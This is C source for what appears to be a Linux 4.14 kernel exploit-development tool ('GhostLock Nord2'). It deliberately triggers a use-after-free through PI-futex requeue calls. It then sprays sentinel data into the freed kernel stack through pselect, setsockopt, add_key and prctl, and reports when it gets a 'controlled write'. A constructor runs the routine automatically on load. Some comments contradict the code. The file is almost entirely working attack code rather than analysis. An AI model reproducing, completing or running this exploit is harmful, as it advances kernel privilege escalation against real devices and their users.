/*
 * Nord2 stack offset measurer.
 * 
 * After triggering the UAF (pi_blocked_on dangling), we call sched_setattr
 * to walk rt_mutex_adjust_prio_chain through the freed waiter.
 * 
 * The prio value in /proc/stat tells us what value is at waiter->prio_off (0x18)
 * in the freed stack frame BEFORE any reclaim.
 * 
 * Then we try different "reclaim" syscalls, each filling a known sentinel pattern,
 * and see which one causes prio to change to our sentinel value.
 * 
 * rt_mutex_waiter layout (4.14):
 *   +0x00: tree rb_node (24 bytes)
 *   +0x18: prio (int)
 *   +0x1c: deadline (u64)
 *   +0x28: pi_tree rb_node (24 bytes)  
 *   +0x40: pi_prio (int)
 *   +0x48: pi_deadline (u64)
 *   +0x50: task (pointer)
 *   +0x58: lock (pointer)
 *   +0x60: wake_state (int)
 *   +0x68: ww_ctx (pointer)
 *   total ~= 0x70 bytes
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <linux/futex.h>
#include <time.h>
#include <errno.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_sched_setattr
#define SYS_sched_setattr 274
#endif

/* sentinel RT prio we want to see */
#define SENTINEL_PRIO   77   /* /proc/stat shows -(77+1) = -78 */
#define SENTINEL_BYTES  0xdeadbeef

struct my_sched_attr {
    uint32_t size, sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime, sched_deadline, sched_period;
};

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0, g_route_done=0;

static int get_prio(pid_t tid) {
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

static void trigger_uaf_read(pid_t tid) {
    /* Only use FUTEX_LOCK_PI which is safer than sched_setattr */
    struct timespec ft={0,5000000};
    long r=syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,&ft,NULL,0);
    if(r==0) syscall(SYS_futex,&f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
}

void *owner_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while (!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    for(;;) sleep(1);
    return NULL;
}

static atomic_int g_do_reclaim=0;
static atomic_int g_reclaim_done=0;
static int g_reclaim_mode=0;

void *waiter_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while (!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    /* UAF trigger: after this returns, stack frame freed */
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);

    /* === RECLAIM ATTEMPT === */
    /* Wait for main to signal which reclaim method to use */
    while (!atomic_load(&g_do_reclaim)) usleep(100);

    int mode = g_reclaim_mode;
    if (mode == 0) {
        /* No reclaim - baseline */
    } else if (mode == 1) {
        /* pselect with fd_set full of sentinel */
        fd_set fds; FD_ZERO(&fds);
        unsigned long *b = (unsigned long*)&fds;
        /* fill with sentinel prio value at various offsets */
        for (int i=0;i<sizeof(fds)/sizeof(*b);i++) b[i] = (unsigned long)SENTINEL_PRIO;
        int dn=open("/dev/null",O_RDONLY);
        int hfd=fcntl(dn,F_DUPFD,319); close(dn);
        struct timespec tv={0,1};
        pselect(hfd+1,&fds,NULL,NULL,&tv,NULL);
        close(hfd);
    } else if (mode == 2) {
        /* setsockopt - SO_RCVBUF copies data to kernel stack */
        int sv[2]; socketpair(AF_UNIX,SOCK_STREAM,0,sv);
        /* fill a large buffer with sentinel */
        unsigned long buf[256];
        for (int i=0;i<256;i++) buf[i]=SENTINEL_PRIO;
        /* setsockopt copies to kernel stack in some code paths */
        setsockopt(sv[0],SOL_SOCKET,SO_RCVBUF,buf,sizeof(buf));
        close(sv[0]); close(sv[1]);
    } else if (mode == 3) {
        /* keyctl - adds key with sentinel data on kernel stack */
        /* add_key copies data through stack */
        char desc[256]; memset(desc,0,sizeof(desc));
        unsigned long sentinel_data[64];
        for (int i=0;i<64;i++) sentinel_data[i]=SENTINEL_PRIO;
        syscall(217/*__NR_add_key*/,"user","ghostlock_test",
                sentinel_data,sizeof(sentinel_data),0);
    } else if (mode == 4) {
        /* prctl(PR_SET_NAME) - copies 16 bytes to kernel stack */
        char name[16]; memset(name, SENTINEL_PRIO & 0xff, 16);
        prctl(PR_SET_NAME, name);
    }

    atomic_store(&g_reclaim_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while (!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

static void reset_state(void) {
    f_wait=0; f_pi_target=0; f_pi_chain=0;
    atomic_store(&g_tid,0); atomic_store(&g_ready,0);
    atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
    atomic_store(&g_owner_done,0); atomic_store(&g_route_done,0);
    atomic_store(&g_do_reclaim,0); atomic_store(&g_reclaim_done,0);
}

static int run_test(int mode) {
    reset_state();
    g_reclaim_mode = mode;

    pthread_t ot,wt;
    pthread_create(&ot,NULL,owner_fn,NULL);
    pthread_create(&wt,NULL,waiter_fn,NULL);

    while (!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
    usleep(5000);

    /* trigger UAF */
    syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);

    /* signal waiter to do reclaim FIRST */
    usleep(2000);
    atomic_store(&g_do_reclaim,1);

    /* wait for reclaim to complete */
    while (!atomic_load(&g_reclaim_done)) usleep(500);
    usleep(2000);

    /* THEN trigger UAF read - now stack hopefully has our data */
    pid_t tid=(pid_t)atomic_load(&g_tid);
    trigger_uaf_read(tid);
    usleep(5000);

    int p = get_prio(tid);
    pthread_detach(ot); pthread_detach(wt);
    return p;
}

int main(void) {
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== GhostLock Nord2 - Stack Reclaim Finder ===\n");
    fprintf(stderr,"Sentinel RT prio: %d -> /proc shows -%d\n\n",
            SENTINEL_PRIO, SENTINEL_PRIO+1);

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    const char *names[] = {
        "none (baseline)",
        "pselect fd_set full",
        "setsockopt",
        "add_key",
        "prctl(PR_SET_NAME)",
    };

    for (int mode=0; mode<=4; mode++) {
        int p = run_test(mode);
        int rt = (p < 0 && p != -999) ? -(p+1) : 0;
        fprintf(stderr,"[mode %d: %-25s] prio=%d  RT=%d  %s\n",
                mode, names[mode], p, rt,
                rt == SENTINEL_PRIO ? "<-- MATCH! CONTROLLED WRITE!" : 
                (p < -1 ? "UAF fired (random)" : "no UAF"));
        usleep(50000);
    }
    return 0;
}
__attribute__((constructor)) static void _init(void) { main(); }
